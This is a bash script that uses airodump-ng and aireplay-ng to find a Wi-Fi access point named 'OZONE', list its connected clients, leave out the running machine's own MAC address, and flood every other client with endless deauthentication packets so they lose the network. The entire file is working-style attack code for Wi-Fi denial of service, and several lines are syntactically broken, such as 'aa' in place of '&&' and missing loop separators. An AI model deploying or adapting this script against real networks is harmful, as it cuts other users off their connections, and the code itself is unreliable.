#!/bin/bash


BSSID_CHA=$(cat AP.txt | grep OZONE | cut -d " " -f24 | tail -1) 
echo "channel of AP : $BSSID_CHA "

IFACE_NAME=$(netstat -i | tail -1 | cut -d " " -f1)
echo "interface name : $IFACE_NAME" 

airodump-ng $IFACE_NAME > AP.txt  & 

BSSID_MAC=$(cat AP.txt  | grep OZONE | cut -d " " -f2 | head -n 1)  
echo "mac of the AP  $BSSID_MAC"

CLIENT_MACS=()

while IFS= read -r line; do
	CLIENT_MACS+=("$line")
done < <(sed -n '6,$p' cap_out-01.csv | cut -d " " -f1 | sed 's/,$//')


# Get ESSID of the machine
ESSID_MACH=$(ifconfig wlan0  | head -n 4 | tail -n -1 | cut -d " " -f10)
echo "mac of the current machine  $ESSID_MACH"

echo "ESSID of the clients connected to the AP "
for i in "${!CLIENT_MACS[@]}"; do
	if [[ "${CLIENT_MACS[$i]}" == "$ESSID_MACH" ]]; then
		unset "CLIENT_MACS[$i]"
		echo "Client Number  $i     $CLIENT_MACS[$i]" 
		break
	fi
done

# looping throught the array and execlude the rest every client connected
for mac in "${CLIENT_MACS[@]}"; do
	for i in {1..10}; do

		AUTH_CHA=$(aireplay-ng -0 0 -a $BSSID_MAC $IFACE_NAME | cut -d " " -f11 | head -n 1 && sleep 5  ) 
			while [[ $AUTH_CHA != $BSSID_CHA ]] do 
				echo "Deauthification must be on channel $AUTH_CHA" 
				echo "Trying again" 
				AUTH_CHA=$(aireplay-ng -0 0 -a $BSSID_MAC $IFACE_NAME | cut -d " " -f11 | head -n 1 aa sleep 5 ) 

			done	
			for i in {1..10} do 
					aireplay-ng -0 0 -a $BSSID_MAC  -c $mac $IFACE_NAME
			done 





		aireplay-ng -0 0 -a $BSSID_MAC -c $mac $IFACE_NAME
	done
done
